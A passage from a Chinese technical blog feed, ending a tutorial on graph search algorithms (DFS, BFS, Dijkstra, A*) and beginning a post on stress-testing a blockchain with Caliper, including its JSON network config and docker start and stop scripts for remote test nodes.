href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h3 id="图结构的邻接矩阵表示法"><a href="#图结构的邻接矩阵表示法" class="headerlink" title="图结构的邻接矩阵表示法"></a>图结构的邻接矩阵表示法</h3><p><strong>邻接矩阵</strong>用来表示图的边集，即节点间的相邻关系集合。设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276356-ada93f8f-d8ba-4f17-98ec-9af058cd477f.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc6664d&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=102&originalType=url&status=done&style=none&taskId=u8e0433de-cbce-4ed5-b260-4e2f71ad8c0&width=51"> 是一个具有 n 个节点的图，它的邻接矩阵是一个 n 阶矩阵，则其中的元素 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276341-89563210-0b27-48f5-992c-5bc26999cdaa.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=udc2dd334&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=24&originalType=url&status=done&style=none&taskId=u2df13e1a-f9b8-4281-823a-168ccdf6e50&width=12"> 满足：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-1.svg#clientId=u4512e8b3-315c-4&from=paste&height=34&id=ubaaea0f0&margin=%5Bobject%20Object%5D&originHeight=68&originWidth=432&originalType=url&status=done&style=none&taskId=ud90780c7-8c45-4351-afd3-b4a40e55462&width=216"><br>对于无向图，其邻接矩阵是对称矩阵，即 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276360-06638203-15d1-4db8-9832-91cda47c94af.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=u782dacff&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=77&originalType=url&status=done&style=none&taskId=u190fa9eb-a53b-4d83-b57a-bcaa10caa34&width=38.5"> ，而有向图的邻接矩阵不一定对称，其空间复杂度均为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276368-54baba56-84e8-456e-9a3a-2228ee191d73.svg#clientId=u4512e8b3-315c-4&from=paste&height=15&id=u082a2bca&margin=%5Bobject%20Object%5D&originHeight=29&originWidth=54&originalType=url&status=done&style=none&taskId=u3f3f3403-8b0c-41d0-9d2a-a53d9cf6fb2&width=27"> 。以下为两个不带权图的邻接矩阵示例：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-2.jpg#clientId=u4512e8b3-315c-4&from=paste&height=146&id=u6d0c1531&margin=%5Bobject%20Object%5D&originHeight=291&originWidth=300&originalType=url&status=done&style=none&taskId=ua9947cb2-a6f0-4a06-b876-917c53e91ed&width=150"><br>对于<strong>带权图</strong>，设 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276919-e8f40e24-f907-48d0-9439-9c210e6637b7.svg#clientId=u4512e8b3-315c-4&from=paste&height=14&id=ucc327eee&margin=%5Bobject%20Object%5D&originHeight=27&originWidth=71&originalType=url&status=done&style=none&taskId=udc0d541f-3cdf-48fb-bd16-1da62d51156&width=35.5"> 或者 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276928-11917431-d782-4dbc-afcd-7d8bfe260858.svg#clientId=u4512e8b3-315c-4&from=paste&height=8&id=u386178d2&margin=%5Bobject%20Object%5D&originHeight=15&originWidth=10&originalType=url&status=done&style=none&taskId=uf489f51a-13af-43ec-ba53-deea1911e98&width=5"> 上的权值为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725277029-5536e091-2e54-43da-acfc-3aee813c2193.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=uaf1ce0d4&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=28&originalType=url&status=done&style=none&taskId=u0cdccce9-6f0a-43c0-87fe-f34571b4c94&width=14"> ，则带权图的邻接矩阵定义为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-3.svg#clientId=u4512e8b3-315c-4&from=paste&height=48&id=u5b09c490&margin=%5Bobject%20Object%5D&originHeight=95&originWidth=452&originalType=url&status=done&style=none&taskId=u09279262-4765-43c1-8607-7946ed5add6&width=226"><br>以下为两个带权图的邻接矩阵示例：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-4.jpg#clientId=u4512e8b3-315c-4&from=paste&height=156&id=ue0476deb&margin=%5Bobject%20Object%5D&originHeight=312&originWidth=300&originalType=url&status=done&style=none&taskId=ub5290b0d-99b5-4ace-9bc6-458f46faf37&width=150"></p><h2 id="深度优先搜索-DFS"><a href="#深度优先搜索-DFS" class="headerlink" title="深度优先搜索(DFS)"></a>深度优先搜索(DFS)</h2><p>深度优先，顾名思义即深度越大的节点会被优先扩展。在 DFS 中，使用<strong>栈(Stack)**数据结构来实现上述特性。<br>栈是一种</strong>后进先出(LIFO)<strong>的容器，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-5.jpg#clientId=u4512e8b3-315c-4&from=paste&height=187&id=ub038a80c&margin=%5Bobject%20Object%5D&originHeight=229&originWidth=252&originalType=url&status=done&style=none&taskId=u32928bb0-c0d9-4527-918f-e65db8c6619&width=206"><br>以在下面的</strong>无权图**中找到从节点 a 到节点 i 的路径为例，说明一下 DFS 算法的工作流程<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-6.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u70b5387b&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=368&originalType=url&status=done&style=none&taskId=u2ec2716b-c4cd-49e2-8c58-e23e99018da&width=184"><br>按照上节的图搜索算法的基本流程进行搜索，过程如下：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-7.jpg#clientId=u4512e8b3-315c-4&from=paste&height=118&id=ue3f3c139&margin=%5Bobject%20Object%5D&originHeight=236&originWidth=1277&originalType=url&status=done&style=none&taskId=u0dcdaa19-58a5-4b08-b306-9e472773c16&width=638.5"><br>从 i 回溯得到路径：a-&gt;b-&gt;c-&gt;g-&gt;i，如下：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-8.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u449947f3&margin=%5Bobject%20Object%5D&originHeight=273&originWidth=367&originalType=url&status=done&style=none&taskId=u2b885412-dc7b-4b20-ac5a-b819ab82efd&width=183.5"></p><h2 id="广度优先搜索-BFS"><a href="#广度优先搜索-BFS" class="headerlink" title="广度优先搜索(BFS)"></a>广度优先搜索(BFS)</h2><p>与 DFS 的“不撞南墙不回头”的个性不同，BFS 在搜索时呈<strong>波状推进</strong>形式，一路稳扎稳打，它是一种<strong>以时间换空间</strong>的方法，能够保证搜索到的路径是最优的。<br>为了实现波状推进搜索特性，BFS 采用<strong>队列(Queue)**作为 openlist 的数据结构。队列是一种</strong>先进先出(FIFO)**的容器，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-9.jpg#clientId=u4512e8b3-315c-4&from=paste&height=88&id=ud12a1bda&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=643&originalType=url&status=done&style=none&taskId=u3a1b1346-f237-46b8-9d09-a3b4054e02d&width=321.5"><br>其流程与上节中 DFS 类似，继续以上节的图举例，过程如下，首先创建一个队列作为容器，将节点 a 加入队列</p><p><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-10.jpg#clientId=u4512e8b3-315c-4&from=paste&height=54&id=uac838178&margin=%5Bobject%20Object%5D&originHeight=108&originWidth=744&originalType=url&status=done&style=none&taskId=ufb837890-53a7-4c8a-b201-4f00e37582e&width=372"><br>接着将节点 a 弹出队列，将节点 a 周围没有访问过的节点加入队列<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-11.jpg#clientId=u4512e8b3-315c-4&from=paste&height=84&id=u1a3884c7&margin=%5Bobject%20Object%5D&originHeight=168&originWidth=752&originalType=url&status=done&style=none&taskId=u06bcf717-b733-4fe0-a0e8-e47485993d0&width=376"><br>按照上面的流程不断地<strong>弹出、扩展</strong>节点，直到找到节点 i 为止，完整流程如下图：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-12.jpg#clientId=u4512e8b3-315c-4&from=paste&height=384&id=u4b228bb6&margin=%5Bobject%20Object%5D&originHeight=768&originWidth=752&originalType=url&status=done&style=none&taskId=uf69ba2e0-88b1-4285-8540-21d9787fb80&width=376"><br>从终点回溯，i 的父节点为 f，f 的父节点为 e，e 的父节点为 a，这样就可以得到 a 到 i 的最短路径为：a-&gt;e-&gt;f-&gt;i，如下<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-13.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=200&id=u9d7c5033&margin=%5Bobject%20Object%5D&originHeight=399&originWidth=720&originalType=url&status=done&style=none&taskId=ube00c3d7-c002-4c0a-9de2-74816c1441b&width=360"><br>显而易见，相较于 DFS，BFS 中使用了大量的入队、出队操作，耗时增加，但是能保证找到最优路径。</p><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><p>上面的算法中，只有广度优先搜索(BFS)具有完备性，能够保证搜索到最优路径。但是可以看到 BFS 算法搜索到的路径只有向上/下/左/右移动这四个动作，它们是没有权值或者说权值都相同的，只能用于无权图的路径规划，无法实现能够对角移动的路径规划。因此下面介绍一种能用于带权图的图搜索算法——Dijkstra 算法(狄克斯特拉算法)。<br>Dijkstra 算法是从一个顶点到其余各顶点的最短路径算法，其流程仍然与上述算法基本一致，它也是用优先队列作为 openlist 的数据结构，它和 GBFS 的区别在于代价函数<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691035-98fc7aa9-f863-4712-bac3-8f57411585e6.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u28f910d0&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=uabd98f3e-5132-480c-8650-2d94afd29b4&width=20">的定义，Dijkstra 算的<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691113-2bf1da8e-b611-4885-a7f1-04164c40d237.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ubf3cbf54&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=ufbbe61e2-28bc-45d0-b633-061774a7863&width=20">定义为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-14.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=uc782ed82&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=107&originalType=url&status=done&style=none&taskId=u79b0ef1e-5762-4b77-8b5b-162e6ba7aa0&width=53.5"><br>其中<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723690991-a4dc7fa7-b40f-4515-b86e-7febdfd73f37.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc7f663&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u82673318-68cb-422c-b8b2-88439071c0e&width=19.5">表示<strong>从起点到当前点的移动代价</strong>。<br>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a><br>以下图为例，计算起点 a 到终点 i 的最短路径，箭头上的数值表示<strong>两个节点间的距离</strong><br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-15.jpg#clientId=u4512e8b3-315c-4&from=paste&height=138&id=uce92bbd0&margin=%5Bobject%20Object%5D&originHeight=275&originWidth=369&originalType=url&status=done&style=none&taskId=u1b2110ca-eadb-4f25-8e5d-d5865274f54&width=184.5"><br>首先扩展第一个节点，计算其余节点与第一个节点的距离，用橙色标出已经扩展的节点，未扩展的节点仍用绿色标出，其中圆中的数值表示<strong>该节点的代价函数</strong>，字母则表示该节点没有直接到达此时已扩展节点的路径。从未扩展的节点(绿色节点)中选择代价函数最小的节点进行拓展，并更新其余节点的代价函数，如下图<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-16.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=uc0f1683a&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=1124&originalType=url&status=done&style=none&taskId=u8a1450f1-79f9-4399-8f8d-e169c2c3ede&width=562"><br>重复进行上面的步骤，直到所有节点都已扩展。<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-17.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=270&id=u45e4071d&margin=%5Bobject%20Object%5D&originHeight=539&originWidth=720&originalType=url&status=done&style=none&taskId=ud51a5969-c955-4e39-8e84-4a846498db9&width=360"><br>最后标出起点到终点的最短路径<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-18.png#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u56f0c87f&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=369&originalType=url&status=done&style=none&taskId=ua013e2b8-7911-432c-a37e-57920b0aa19&width=184.5"></p><h2 id="A-算法"><a href="#A-算法" class="headerlink" title="A*算法"></a>A*算法</h2><p>对比 GBFS 和 Dijkstra 算法，两者都采用优先队列作为 openlist，而代价函数的不同导致两者具有不同的优点：GBFS 用节点到目标点的距离作为代价函数，将搜索方向引向目标点，搜索效率高；而 Dijkstra 算法采用起点到当前扩展节点的移动代价作为代价函数，能够确保路径最优。<br>那么可不可以将两者的代价函数进行融合，从而<strong>在保证路径最优的同时提高搜索效率</strong>？答案是肯定的，融合后的算法就是<strong>A*算法</strong>。<br>A<em>算法也是一种启发式算法，它的代价函数表示为：<br><img src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-19.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u5a11f40f&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=174&originalType=url&status=done&style=none&taskId=u6444210b-d148-4737-8444-6e7a899159f&width=87"><br>其中 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031612-4bb2e537-3a2a-43f0-9430-720081543412.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ua1c55913&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u81437d7e-75f3-4519-8ad2-3f4d8947340&width=19.5"> 为起点到当前扩展节点的移动代价函数， <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031588-880c54fd-53e9-4a32-ae42-9b033a83bcc7.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2774a467&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u26212a94-ede6-4884-b185-f79bf3560b3&width=20.5"> 是启发函数，用节点到目标点的距离函数来表示。<br>根据这个式子，可以得到 A</em>算法的几个特点：</p><ul><li>如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-3ccd0531-4927-431f-bb82-79cc2f0029e8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u734ded48&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=79&originalType=url&status=done&style=none&taskId=u1854bd03-0452-47f9-9cb0-a773eb37eb7&width=39.5"> ，A<em>算法就退化为 Dijkstra 算法；如果令 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725031585-161dbbd5-4e20-44d9-b575-43d61c553747.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u1cba9235&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=77&originalType=url&status=done&style=none&taskId=u1149f333-b9a7-4bf2-a3f1-b93cd429b0c&width=38.5">_，_A</em>算法就退化为 GBFS 算法。</li><li>能否找到最优路径的关键是启发函数 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036315-f0c86fa9-aa76-4298-a880-bf792907b269.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u2e57cf76&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u2548ee5d-b15d-4954-9fe6-004bffcb214&width=20.5"> 的选取，如果 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725036325-3ea21fc5-28b7-4eca-8740-e12dce2238c8.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u7c5a7978&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=41&originalType=url&status=done&style=none&taskId=u0f640d4a-3324-49b1-8fee-a3ec3ce5d3e&width=20.5"> 在大部分情况下比从当前节点到目标点的移动代价小，则能找到最优路径。</li><li>由于 A* 算法的启发函数是位置上的距离，因此在不带位置信息的图数据中不适用。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：&lt;strong&gt;深度优先搜索(Depth First Search, DFS)**、&lt;/strong&gt;广度优先搜索(Breadth First Search, BFS)&lt;strong&gt;。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：&lt;/strong&gt;贪婪最佳优先算法*&lt;em&gt;(&lt;strong&gt;Greedy Best First Search, GBFS&lt;/strong&gt;)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：&lt;strong&gt;Dijkstra 算法&lt;/strong&gt;、**A\&lt;/em&gt;算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.blog.hackerjerry.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    <category term="图论" scheme="https://www.blog.hackerjerry.top/categories/%E7%AE%97%E6%B3%95/%E5%9B%BE%E8%AE%BA/"/>
    
    
    <category term="图搜索算法" scheme="https://www.blog.hackerjerry.top/tags/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>区块链性能测试</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95_new/</id>
    <published>2021-05-06T12:58:59.000Z</published>
    <updated>2021-11-14T09:11:59.544Z</updated>
    
    <content type="html"><![CDATA[<p>对区块链进行性能测试</p><a id="more"></a><h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>目前，主流平台基本支持 Caliper 压力测试。<br>官方文档：<br>【1】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/4_tools/46_stresstest/caliper_stress_test_practice.html">性能压测工具 Caliper 在 FISCO BCOS 平台中的实践</a><br>【2】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html#caliper">通过 Caliper 进行压力测试程序</a><br>其他个人业务 demo：<br>【1】<a href="https://blog.csdn.net/manok/article/details/82084852">基于区块链技术的性能测试</a><br>【2】<a href="https://bbs.huaweicloud.com/blogs/204653">基于 Fabric 的性能测试与调优实践</a><br>【3】<a href="https://www.infoq.cn/article/block-chain-practice">区块链性能测评实战案例</a></p><p>其他 web 服务器测压思路比如，Apachebench，redisbench，wrk</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>网络配置</li><li>设备配置</li><li>redis 截图<ol><li>查询性能</li><li>共识性能</li></ol></li><li>见本子</li></ol><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;test&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;blockchain&quot;</span>: <span class="hljs-string">&quot;block-dag&quot;</span>,<br>    <span class="hljs-attr">&quot;command&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/start.sh&quot;</span>,<br>      <span class="hljs-attr">&quot;end&quot;</span>: <span class="hljs-string">&quot;sh block-dag/stress-testing/end.sh&quot;</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;minner&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;config&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;privateKey&quot;</span>: <span class="hljs-string">&quot;bcec428d5205abe0f0cc8a734083908d9eb8563e31f943d760786edf42ad67dd&quot;</span>,<br>      <span class="hljs-attr">&quot;account&quot;</span>: <span class="hljs-string">&quot;0x64fa644d2a694681bd6addd6c5e36cccd8dcdde3&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;network&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;nodes&quot;</span>: [<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.1&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.2&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;,<br>        &#123;<br>          <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;192.168.1.3&quot;</span>,<br>          <span class="hljs-attr">&quot;rpcPort&quot;</span>: <span class="hljs-string">&quot;6001&quot;</span>,<br>          <span class="hljs-attr">&quot;channelPort&quot;</span>: <span class="hljs-string">&quot;9001&quot;</span><br>        &#125;<br>      ],<br>      <span class="hljs-attr">&quot;authentication&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.key&quot;</span>,<br>        <span class="hljs-attr">&quot;cert&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/node.crt&quot;</span>,<br>        <span class="hljs-attr">&quot;ca&quot;</span>: <span class="hljs-string">&quot;block-dag/stress-testing/sdk/ca.crt&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;timeout&quot;</span>: <span class="hljs-number">900000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>command.start</strong><br>首先执行 start 配置中指定的命令，主要用于使用 Docker 模式启动，启动 Caliper 时首先执行当前目录下的 start.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 run -d --rm --name node0 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.2:6001 run -d --rm --name node1 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br>docker -H 192.168.1.3:6001 run -d --rm --name node2 -v /data/test/node0/:/data -p 8000:8000 -p 20914:20914 -p 9001:9001 -w=/data dag/blockdag:latest -c config.ini 1&gt; /dev/null<br></code></pre></td></tr></table></figure><p>即启动远程的 Docker 容器。<br><strong>command.end</strong><br>Caliper 在退出流程的最后会执行 end 配置指定的命令，主要用于清理环境。本例中在测试结束时会执行当前目录下的 end.sh 文件，其具体内容是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -H 192.168.1.1:6001 stop $(docker -H 192.168.1.1:6001 ps -a | grep node0 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node0 stopped\033[0m&quot;<br>docker -H 192.168.1.2:6001 stop $(docker -H 192.168.1.2:6001 ps -a | grep node1 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node1 stopped\033[0m&quot;<br>docker -H 192.168.1.3:6001 stop $(docker -H 192.168.1.3:6001 ps -a | grep node2 | cut -d &quot; &quot; -f 1) 1&gt; /dev/null &amp;&amp; echo -e &quot;\033[32mremote container node2 stopped\033[0m&quot;<br></code></pre></td></tr></table></figure><p>即停止并删除有所的远程容器。<br><strong>network.nodes</strong><br>一个包含了所有要连接节点的列表，列表中每一项需要指明被连接节点的 IP 地址、RPC 端口及 Channel 端口号，所有端口号需要和节点的配置文件保持一致。<br><strong>network.authentication</strong><br>适配器向节点的 Channel 端口发起请求时需要使用 CA 根证书等文件，这些文件已在 3.1.2 节中调用 build_chain.sh 脚本时已经生成好，使用任一节点配置下的 sdk 文件夹中的相应文件即可，需要在该配置中写上所有文件的路径。</p><h1 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 